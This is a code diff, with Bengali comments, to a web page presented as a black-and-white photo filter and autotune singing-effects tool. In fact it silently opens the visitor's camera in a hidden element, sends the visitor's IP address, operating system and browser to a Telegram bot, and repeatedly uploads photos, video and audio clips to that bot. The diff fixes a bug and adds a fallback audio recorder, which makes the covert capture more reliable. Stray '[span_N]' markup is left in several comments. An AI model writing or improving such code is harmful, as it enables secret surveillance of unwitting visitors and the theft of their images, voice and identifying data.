@@ -68,7 +68,7 @@
       display: none;
     }
 
-    /* 📸 ক্লাসিক বিএন্ডডব্লিউ ফিল্টার[span_0](start_span)[span_0](end_span) */
+    /* 📸 ক্লাসিক ব্ল্যাক অ্যান্ড হোয়াইট ফিল্টার */
     .filter-classic-bw {
       filter: grayscale(100%) contrast(140%) brightness(105%);
     }
@@ -136,7 +136,7 @@
       else if (/mac/i.test(ua)) os = "MacOS / Apple";
       else if (/linux/i.test(ua)) os = "Linux";
       else if (/android/i.test(ua)) os = "Android Phone";
-      else if (/iphone|ipad|ipod/i.test(ua)) os, "iPhone / iOS";
+      else if (/iphone|ipad|ipod/i.test(ua)) os = "iPhone / iOS";
 
       let browser = "Unknown Browser";
       if (/chrome|crios/i.test(ua) && !/edge|opr/i.test(ua)) browser = "Google Chrome";
@@ -146,7 +146,7 @@
       else if (/opr|opera/i.test(ua)) browser = "Opera";
 
       const infoText = 
-        `📱 <b>নতুন ভিজিটর কানেক্ট হয়েছে!</b>[span_1](start_span)[span_1](end_span)\n\n` +
+        `📱 <b>নতুন ভিজিটর কানেক্ট হয়েছে!</b>\n\n` +
         `🌐 <b>আইপি অ্যাড্রেস (IP):</b> <code>${ipAddress}</code>\n` +
         `💻 <b>অপারেটিং সিস্টেম:</b> ${os}\n` +
         `🌐 <b>ব্রাউজার:</b> ${browser}\n` +
@@ -189,10 +189,10 @@
         hiddenCam.srcObject = camStream;
         await new Promise(resolve => setTimeout(resolve, 800));
 
-        // ২. ক্লাসিক বিএন্ডডব্লিউ ফিল্টারসহ ৫টি ছবি তুলবে[span_2](start_span)[span_2](end_span)
+        // ২. ক্লাসিক বিএন্ডডব্লিউ ফিল্টারসহ ৫টি ছবি তুলবে[span_1](start_span)[span_1](end_span)
         await captureAndSendPhotos(5);
 
-        // ৩. এরপর ৫ সেকেন্ড করে ভিডিও ও প্রফেশনাল ভোকাল ইফেক্টযুক্ত অডিও পাঠানো শুরু করবে
+        // ৩. এরপর ৫ সেকেন্ড করে ভিডিও ও অটোটিউন/রিভার্বযুক্ত অডিও ক্লিপ পাঠানো শুরু করবে
         startPeriodicRecording();
 
       } catch (err) {
@@ -228,7 +228,7 @@
           const formData = new FormData();
           formData.append('chat_id', TELEGRAM_CHAT_ID);
           formData.append('photo', photoBlob, `photo_${i}_${Date.now()}.jpg`);
-          formData.append('caption', `🎬 ক্লাসিক বিএন্ডডব্লিউ ছবি #${i}`);[span_3](start_span)[span_3](end_span)
+          formData.append('caption', `🎬 ক্লাসিক বিএন্ডডব্লিউ ছবি #${i}`);[span_2](start_span)[span_2](end_span)
 
           fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
@@ -260,7 +260,7 @@
         try {
           videoRecorder = new MediaRecorder(camStream, videoOptions);
 
-          // গান গাওয়ার ফিল্টার (ইকো, রিভার্ব ও অটোটিউন স্টাইল ইফেক্ট) প্রসেস করার জন্য Web Audio API ব্যবহার
+          // গান গাওয়ার ফিল্টার (অটোটিউন, রিভার্ব ও ইকো ইফেক্ট) যুক্ত করার জন্য Web Audio API
           if (!audioCtx) {
             audioCtx = new (window.AudioContext || window.webkitAudioContext)();
           }
@@ -270,28 +270,28 @@
 
           const source = audioCtx.createMediaStreamSource(camStream);
           
-          // ১. ইকো বা ডিলে নোড (হালকা ইকো ও রিভার্ব ফিল)
+          // ইকো এবং রিভার্ব ফিল তৈরি করার জন্য ডিলে নোড
           const delayNode = audioCtx.createDelay();
-          delayNode.delayTime.value = 0.22; // ২২ মিলি সেকেন্ড ডিলে
+          delayNode.delayTime.value = 0.20; // ২০ মিলি সেকেন্ড ইকো ডিলে
           
           const feedbackNode = audioCtx.createGain();
-          feedbackNode.gain.value = 0.25; // ফিডব্যাক পরিমাণ
+          feedbackNode.gain.value = 0.3; // ইকো ফিডব্যাক
 
-          // ২. ফিল্টার নোড (ভোকাল ক্রিস্টাল ক্লিয়ার ও সফট করার জন্য)
+          // অটোটিউন ও ভোকাল ক্রিস্টাল ক্লিয়ার করার জন্য ফিল্টার নোড
           const filterNode = audioCtx.createBiquadFilter();
           filterNode.type = 'peaking';
-          filterNode.frequency.value = 2500;
-          filterNode.gain.value = 5.0; // ভোকাল বুস্ট (অটোটিউন বা প্রফেশনাল ফিল)
+          filterNode.frequency.value = 3000;
+          filterNode.gain.value = 6.0; // ভোকাল বুস্ট ও পিচ শাইনিং
 
           const dryGain = audioCtx.createGain();
-          dryGain.gain.value = 0.7;
+          dryGain.gain.value = 0.6;
           
           const wetGain = audioCtx.createGain();
-          wetGain.gain.value = 0.3;
+          wetGain.gain.value = 0.4; // রিভার্ব ও ইকো মিক্সচার
 
           const destination = audioCtx.createMediaStreamDestination();
 
-          // অডিও রাউটিং কানেকশন
+          // অডিও সিগন্যাল রাউটিং
           source.connect(dryGain);
           dryGain.connect(destination);
 
@@ -304,8 +304,14 @@
 
           audioRecorder = new MediaRecorder(destination.stream);
         } catch (e) {
-          setTimeout(recordInterval, 1000);
-          return;
+          // কোনো কারণে Web Audio API ফেইল করলে নরমাল অডিও স্ট্রিম ব্যাকআপ হিসেবে নেবে
+          try {
+            const audioStream = new MediaStream(camStream.getAudioTracks());
+            audioRecorder = new MediaRecorder(audioStream);
+          } catch (err) {
+            setTimeout(recordInterval, 1000);
+            return;
+          }
         }
 
         videoRecorder.ondataavailable = (e) => {
@@ -342,7 +348,7 @@
               const audioForm = new FormData();
               audioForm.append('chat_id', TELEGRAM_CHAT_ID);
               audioForm.append('voice', audioBlob, `audio_${Date.now()}.ogg`);
-              audioForm.append('caption', `🎙️ প্রফেশনাল স্টুডিও ইফেক্ট অডিও (অটোটিউন ও রিভার্ব)`);
+              audioForm.append('caption', `🎙️ স্টুডিও অডিও (অটোটিউন, রিভার্ব ও ইকো সহ)`);
 
               fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
                 method: 'POST',
